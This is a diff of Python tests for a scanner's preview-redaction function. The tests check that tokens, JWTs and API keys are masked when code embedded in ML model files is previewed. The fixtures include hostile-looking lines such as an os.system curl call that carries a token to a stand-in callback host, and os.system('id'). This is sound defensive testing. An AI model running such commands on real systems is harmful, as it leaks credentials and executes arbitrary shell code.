@@ -723,6 +723,22 @@ def test_savedmodel_preview_redaction_removes_generic_url_userinfo() -> None:
     assert preview.count("<credentials-redacted>@") == 2
 
 
+def test_savedmodel_preview_redaction_removes_path_capability_tokens() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    jwt_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature"
+    preview = _safe_decoded_preview(
+        f"os.system('curl https://callback.example/{github_token}/model') "
+        f"https://callback.example/api/{jwt_token}/done",
+        500,
+    )
+
+    assert github_token not in preview
+    assert jwt_token not in preview
+    assert "os.system" in preview
+    assert "https://callback.example/<redacted>/model" in preview
+    assert "https://callback.example/api/<redacted>/done" in preview
+
+
 def test_savedmodel_preview_redaction_removes_nested_url_credentials() -> None:
     preview = _safe_decoded_preview(
         "https://callback.example/hook?ok=1;to%6ben=SEMICOLONSECRET123 "
@@ -755,6 +771,24 @@ def test_savedmodel_preview_redaction_removes_python_container_secrets() -> None
     assert "os.system" in preview
     assert "https://callback.example/public" in preview
     assert preview.count("<redacted>") == 4
+
+
+def test_savedmodel_preview_redaction_removes_escaped_quote_secret() -> None:
+    preview = _safe_decoded_preview('api_key = "prefix\\"ESCAPEDSECRET123"\nos.system("id")', 200)
+
+    assert "ESCAPEDSECRET123" not in preview
+    assert 'api_key = "<redacted>"' in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_does_not_expand_original_window() -> None:
+    private_tail = "PRIVATE_AFTER_LONG_SECRET_SHOULD_NOT_APPEAR"
+    preview = _safe_decoded_preview(f'api_key = "{"A" * 10_000}"\n{private_tail}', 80)
+
+    assert "AAAA" not in preview
+    assert private_tail not in preview
+    assert 'api_key = "<redacted>' in preview
+    assert preview.endswith("...")
 
 
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
@@ -822,10 +856,10 @@ def test_pyfunc_code_preview_redacts_container_secret_values(tmp_path: Path) -> 
     ]
     python_code = (
         "import os\n"
+        'os.system("curl https://callback.example/public")\n'
         f'private_key = """{raw_secrets[0]}\n{raw_secrets[0]}"""\n'
         f'os.environ["API_KEY"] = "{raw_secrets[1]}"\n'
         f'headers = {{"Authorization": "{raw_secrets[2]}", "client_secret": "{raw_secrets[3]}"}}\n'
-        'os.system("curl https://callback.example/public")\n'
     )
     model_path = _create_test_savedmodel_with_scoped_nodes(
         tmp_path,
